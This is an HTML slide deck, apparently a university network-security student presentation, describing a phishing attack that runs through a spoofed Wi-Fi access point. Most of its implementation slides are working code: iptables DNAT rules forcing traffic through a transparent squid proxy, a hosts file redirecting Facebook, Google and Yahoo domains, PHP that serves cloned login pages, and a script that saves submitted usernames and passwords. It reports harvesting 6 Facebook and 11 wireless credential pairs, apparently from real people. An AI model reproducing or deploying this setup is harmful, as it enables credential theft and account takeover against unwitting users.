<!doctype html>
<html lang="en">

	<head>
		<meta charset="utf-8">

		<title>網路釣魚 - Network Security</title>

		<meta name="description" content="A framework for easily creating beautiful presentations using HTML">
		<meta name="author" content="Hakim El Hattab">

		<meta name="apple-mobile-web-app-capable" content="yes" />
		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />

		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<link rel="stylesheet" href="css/reveal.min.css">
		<link rel="stylesheet" href="css/theme/default.css" id="theme">

		<!-- For syntax highlighting -->
		<link rel="stylesheet" href="lib/css/zenburn.css">

		<!-- If the query includes 'print-pdf', use the PDF print sheet -->
		<script>
			document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
        </script>

        <style title="text/css">
          <!--
          #badge {
            position: absolute;
            display: block;
            bottom: 2em;
            left: 1.5em;
            color: #CCC;
            font-size: 130%;
            text-shadow: 0 0 4px #DDD;
          }
          -->
        </style>

		<!--[if lt IE 9]>
		<script src="lib/js/html5shiv.js"></script>
		<![endif]-->
	</head>

    <body>
      <div id="badge">
        國立高雄大學資訊管理學系
      </div>
      <div class="reveal">

        <!-- Any section element inside of this container is displayed as a slide -->
        <div class="slides">

          <section>
            <h1>網路釣魚</h1>
            <h3>Network Security</h3>
            <h5>陳建源 老師</h5>
            <p>
              <small>
                <a href='mailto:a0993360@mail.nuk.edu.tw' title="A0993360">賴韋辰</a> /
                <a href='mailto:a0993363@mail.nuk.edu.tw' title="A0993363">李雅筑</a> / 
                <a href="mailto:a0993358@mail.nuk.edu.tw" title="A0993358">李佳紋</a> / 
                <a href='mailto:a0993357@mail.nuk.edu.tw' title="A0993357">黃任吉</a></small>
            </p>
          </section>

          <section>
            <h2>釣魚網頁</h2>
            <ol>
              <li class="fragment">Facebook</li>
              <li class="fragment">Facebook 行動版</li>
              <li class="fragment">高雄大學無線網路登入</li>
            </ol>
          </section>
          <section>
            <section>
              <h2>魚餌形式</h2>
            </section>
            <section>
              <h2><del>E-Mail</del></h2>
              <ol>
                <li class="fragment">學校信箱使用頻率低</li>
                <li class="fragment">容易被識破</li>
              </ol>
            </section>
            <section>
              <h2><del>Facebook</del></h2>
              <ol>
                <li class="fragment">好友重疊低</li>
                <li class="fragment">容易影響無辜民眾</li>
                <li class="fragment">最近事件</li>
              </ol>
            </section>
            <section>
              <h2>偽造 Wi-Fi</h2>
              <ol>
                <li class="fragment">可控制影響範圍</li>
                <li class="fragment">可以做到網址相同</li>
                <li class="fragment">更容易成功</li>
              </ol>
            </section>
          </section>
          <section>
            <section>
              <h2>實作方式</h2>
            </section>
            <section>
              <h3>架構圖</h3>
            </section>
            <section>
              <h2>FON + dd-wrt</h2>
              <code>
                <pre contenteditable="false">#!/bin/sh
  PROXY_IP=140.127.233.250
  PROXY_PORT=3128
  LAN_IP=`nvram get lan_ipaddr`
  LAN_NET=$LAN_IP/`nvram get lan_netmask`

  iptables -t nat -A PREROUTING -i br0 -s $LAN_NET\
           -d $LAN_NET -p tcp --dport 80 -j ACCEPT
  iptables -t nat -A PREROUTING -i br0 -s ! $PROXY_IP\
           -p tcp --dport 80 -j DNAT --to $PROXY_IP:$PROXY_PORT
  iptables -t nat -I POSTROUTING -o br0 -s $LAN_NET\
           -d $PROXY_IP -p tcp -j SNAT --to $LAN_IP
  iptables -I FORWARD -i br0 -o br0 -s $LAN_NET -d\
           $PROXY_IP -p tcp --dport $PROXY_PORT -j ACCEPT</pre>
              </code>
            </section>
            <section>
              <h2>代理伺服器 - squid <sup style="font-size: 35%; color: #F22;">遠端主機</sup></h2>
            </section>
            <section>
              <h2>Transparent Proxy</h2>
              <p>/etc/squid3/squid.conf</p>
              <code><pre>http_port 3128 <strong style="color:#F92;">transparent</strong></pre>
              </code>
            </section>
            <section>
              <h2>hosts file</h2>
              <code><pre>127.0.0.1       www.facebook.com
127.0.0.1       m.facebook.com
127.0.0.1       www.google.com
127.0.0.1       www.google.com.tw
127.0.0.1       tw.yahoo.com
127.0.0.1       www.yahoo.com
127.0.0.1       zh-tw.facebook.com
127.0.0.1       facebook.com
127.0.0.1       static.ak.fbcdn.net
127.0.0.1       www.static.ak.fbcdn.net
127.0.0.1       login.facebook.com
127.0.0.1       www.login.facebook.com
127.0.0.1       fbcdn.net
127.0.0.1       www.fbcdn.net
127.0.0.1       fbcdn.com
127.0.0.1       www.fbcdn.com
127.0.0.1       static.ak.connect.facebook.com
127.0.0.1       www.static.ak.connect.facebook.com</pre></code>
            </section>
            <section>
              <h2>Hosts File for squid</h2>
              <p>/etc/squid3/squid.conf</p>
              <code><pre>hosts_file     /etc/hosts.squid</pre></code>
            </section>
            <section>
              <h2>NGINX - Web Server</h2>
              <h5>放置釣魚網頁</h5>
            </section>
            <section>
              <h3>根據連線網址給釣魚網頁</h3>
              <code><pre>&lt;?php
if( strpos($_SERVER['HTTP_HOST'], 'm.facebook.com') !== FALSE)
  $ret = file('facebook_mobile_files/return_page.shtml');
else if( strpos($_SERVER['HTTP_HOST'], 'facebook.com') !== FALSE){
  if( strpos($_SERVER['HTTP_USER_AGENT'], 'Mobile Safari') !== FALSE )
    header('Location: http://m.facebook.com/');
  $ret = file('facebook_files/return_page.shtml');
} else
  header('Location: http://140.127.233.250/fs/customwebauth/login.html');

// return page
  foreach($ret as $line)
    echo $line;

?&gt;</pre></code>
            </section>
            <section>
              <h3>recv.php</h3>
              <code>
                <pre>&lt;?php
$json_file = "db/data.json";
if(!isset($_REQUEST['type'],$_REQUEST['username'],$_REQUEST['password'])) {
  header("Location: /");
  var_dump($_REQUEST);
  return;
}
$data_to_push = array('username' =&gt; $_REQUEST['username'],
  'password' =&gt; $_REQUEST['password'],
  'type' =&gt; $_REQUEST['type'] );
$fhandle = fopen($json_file, "r");
$content = json_decode(fread($fhandle, filesize($json_file)));
fclose($fhandle);
if($content === NULL || $content === FALSE)
  $content = array();
$content[] = $data_to_push;
$output_data = json_encode($content);
$fhandle = fopen($json_file, "w");
fwrite($fhandle, $output_data);
fclose($fhandle);
header('Location: /');
?&gt;</pre></code>
            </section>
          </section>

          <section>
            <h2>結果</h2>
            <p class="fragment">2 小時<sub style="font-size: 50%">（約兩節課時間）</sub></p>
            <ul style="font-size: 70%;">
              <li class="fragment">共 <span style="color: #F33; font-size: 1.5em;">119</span> 筆資料</li>
              <li class="fragment"><span style="color: #F92; font-size: 1.2em;">20</span> 組不重複資料</li>
              <li class="fragment"><span style="color: #3A3; font-size: 1.2em;">11</span> 組無線帳號密碼</li>
              <li class="fragment"><span style="color: #24D; font-size: 1.2em;">6</span> 組 Facebook 帳號密碼</li>
            </ul>
          </section>

          <section>
            <section>
              <h2>心得</h2>
            </section>
            <section>
              <h5>未加密公用無線網路是很危險的！<img src='http://statics.plurk.com/846277f0a154dc95a08594b7d32a5ccd.gif' style="background: none; border: none; width: 1em; vertical-align: middle" /></h5>
            </section>
          </section>

          <section>
            <section>
              <h3>取得此簡報</h3>
              <p>github <a href='https://github.com/abev66/'>@abev66</a></p>
              <code>
                <pre>git clone -b NS git://github.com/abev66/reveal.js.git</pre>
              </code>
            </section>
            <section>
              <h1>THANK YOU!</h1>
            </section>
          </section>

        </div>

      </div>

      <script src="lib/js/head.min.js"></script>
      <script src="js/reveal.min.js"></script>

      <script>

        // Full list of configuration options available here:
        // https://github.com/hakimel/reveal.js#configuration
      Reveal.initialize({
        controls: true,
      progress: true,
      history: true,
      center: true,

      theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
      transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none

      // Optional libraries used to extend on reveal.js
      dependencies: [
      { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
      { src: 'plugin/markdown/showdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
      { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
      { src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
      { src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
      { src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
      // { src: 'plugin/search/search.js', async: true, condition: function() { return !!document.body.classList; } }
      // { src: 'plugin/remotes/remotes.js', async: true, condition: function() { return !!document.body.classList; } }
      ]
      });

      </script>

    </body>
  </html>
